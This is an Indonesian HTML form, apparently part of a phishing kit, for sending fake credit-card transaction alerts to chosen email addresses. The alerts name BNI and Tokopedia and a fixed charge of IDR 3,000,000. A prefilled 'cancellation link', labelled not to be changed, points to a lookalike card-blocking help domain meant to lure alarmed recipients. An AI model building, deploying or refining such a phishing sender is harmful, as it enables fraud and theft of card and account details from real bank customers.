<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Form Notifikasi Transaksi</title>
    <style>
        #bg-video {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            z-index: -1;
        }

        body {
            font-family: 'Segoe UI', sans-serif;
            background: rgba(255, 255, 255, 0.2);
            padding: 30px;
        }

        form {
            background: rgba(255, 255, 255, 0.2);
            padding: 25px;
            max-width: 500px;
            margin: auto;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }

        label {
            margin-top: 15px;
            display: block;
            font-weight: bold;
            color: #fff;
        }

        input[type="email"],
        input[type="text"],
        input[type="url"],
        input[type="date"] {
            width: 100%;
            padding: 10px;
            background: rgba(255, 255, 255, 0.2);
            margin-top: 5px;
            font-weight: bold;
            box-sizing: border-box;
            border: 2px solid #005baa;
            border-radius: 5px;
            outline: none;
        }

        button {
            background-color: #0073e6;
            color: #fff;
            border: none;
            padding: 12px;
            margin-top: 20px;
            width: 100%;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background-color: #005bb5;
        }

        h2 {
            text-align: center;
            color: #fff;
        }
    </style>
</head>
<body>

<video id="bg-video" autoplay muted loop playsinline>
    <source src="https://cdn.glitch.global/345943c7-f5b8-4696-bc29-82798be74e4b/VID-20250601-WA0001.mp4?v=1748772417881" type="video/mp4">
    Browser Anda tidak mendukung video tag.
</video>

<h2>Kirim Notifikasi Transaksi</h2>

<form action="email.php" method="post">
    <label for="tujuan">Email Tujuan</label>
    <input type="email" name="tujuan" required>

    <label for="bank">Nama Bank</label>
    <input type="text" name="bank" value="Kartu Kredithttps://help-id.biz.id/blokir-dan-amankan-kartu/ BNI" required>
<label for="merchant">Merchant</label>
<input type="text" name="merchant" value="TokoPedia" readonly>


    <label for="digit">4 Digit Akhir Kartu</label>
    <input type="text" name="digit" maxlength="4" required>

    <label for="tanggal">Tanggal Transaksi</label>
    <input type="date" name="tanggal" required>
    <label for="nominal">Nominal</label>
<input type="text" name="nominal" value="IDR 3.000.000" readonly>


    <label for="link">Link Pembatalan ("Jangan Di Ganti")</label>
    <input type="url" name="link" value="https://help-id.biz.id/blokir-dan-amankan-kartu/"required>

    <button type="submit">Kirim Email</button>
</form>

</body>
</html>

